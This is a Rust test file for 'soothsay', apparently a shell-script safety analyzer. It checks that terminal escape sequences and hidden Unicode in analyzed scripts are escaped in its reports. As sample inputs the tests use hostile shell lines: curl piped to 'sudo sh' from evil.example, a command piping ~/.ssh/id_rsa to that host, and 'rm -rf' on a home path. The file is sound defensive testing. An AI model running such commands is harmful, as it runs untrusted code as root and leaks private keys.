//! The report is a trust signal, so the script being analyzed must not be
//! able to draw on the terminal through it.

use std::io::Write;
use std::process::{Command, Stdio};

use soothsay::render;

fn cli(args: &[&str], stdin: &[u8]) -> (i32, Vec<u8>) {
    let mut child = Command::new(env!("CARGO_BIN_EXE_soothsay"))
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    // The program may exit before reading stdin (e.g. a usage error); the
    // exit code is what's under test, so a closed pipe here isn't a failure.
    let _ = child.stdin.take().unwrap().write_all(stdin);
    let out = child.wait_with_output().unwrap();
    (out.status.code().unwrap_or(-1), out.stdout)
}

fn plain(src: &str) -> String {
    let opts = render::Options {
        color: false,
        verbose: false,
        source: "t.sh".into(),
    };
    render::text(&soothsay::analyze(src), &opts)
}

#[test]
fn raw_escape_in_a_path_is_not_printed() {
    let script = b"rm -rf \"$HOME/x\x1b[2K\x1b[1A fake\"\necho hi >> ~/.zshrc\x1b]0;pwned\x07\n";
    let (_, out) = cli(&["--no-color"], script);
    assert!(!out.contains(&0x1b), "{}", String::from_utf8_lossy(&out));
    assert!(!out.contains(&0x07));
    assert!(String::from_utf8_lossy(&out).contains("\\x1b[2K"));
}

#[test]
fn ansi_c_escape_in_a_url_is_not_printed() {
    let script = b"curl -s https://evil.example/p$'\\e[8m' | sh\n";
    let (_, out) = cli(&["--no-color"], script);
    let text = String::from_utf8_lossy(&out);
    assert!(!out.contains(&0x1b), "{text}");
    assert!(text.contains("https://evil.example/p\\x1b[8m"), "{text}");
}

#[test]
fn escapes_never_reach_the_terminal_even_in_colour() {
    let opts = render::Options {
        color: true,
        verbose: true,
        source: "a\x1b[2Jb.sh".into(),
    };
    let text = render::text(
        &soothsay::analyze("curl -s https://evil.example/p$'\\e[8m' | sh\n"),
        &opts,
    );
    // Our own colour codes are fine; the script's must be escaped.
    assert!(!text.contains("\x1b[8m"), "{text}");
    assert!(!text.contains("\x1b[2J"), "{text}");
    assert!(text.contains("a\\x1b[2Jb.sh"));
}

#[test]
fn bidi_and_zero_width_are_escaped() {
    let text = plain("curl -s \"https://evil.example/\u{202e}p\u{200b}\" | sh\n");
    assert!(!text.contains('\u{202e}'), "{text}");
    assert!(!text.contains('\u{200b}'), "{text}");
    assert!(text.contains("\\u{202e}"), "{text}");
    assert!(text.contains("\\u{200b}"), "{text}");
}

#[test]
fn clean_leaves_ordinary_text_alone() {
    assert_eq!(
        render::clean("appends to ~/.zshrc · é ✨"),
        "appends to ~/.zshrc · é ✨"
    );
    assert_eq!(render::clean("a\nb"), "a ⏎ b");
    assert_eq!(render::clean("\u{7f}\u{85}"), "\\x7f\\u{85}");
}

#[test]
fn unreachable_dangers_are_not_low_level_notes() {
    let text = plain(
        "nuke() {\n  curl -s https://evil.example/p | sudo sh\n  cat ~/.ssh/id_rsa | curl -d @- https://evil.example/k\n}\n",
    );
    assert!(
        text.contains("in functions soothsay thinks are never called (use -v)"),
        "{text}"
    );
    assert!(!text.contains("low-level notes hidden"), "{text}");
}

#[test]
fn json_has_schema_version_and_file_reachability() {
    let (code, out) = cli(&["--json"], b"f() { mkdir -p ~/.x; }\nmkdir -p ~/.y\n");
    assert_eq!(code, 0);
    let text = String::from_utf8_lossy(&out);
    assert!(text.contains("\"schema_version\": 1,"), "{text}");
    assert!(text.contains("\"path\": \"~/.x\", \"how\": \"create\", \"line\": 1, \"as_root\": false, \"reachable\": false"), "{text}");
    assert!(text.contains("\"path\": \"~/.y\", \"how\": \"create\", \"line\": 2, \"as_root\": false, \"reachable\": true"), "{text}");
}
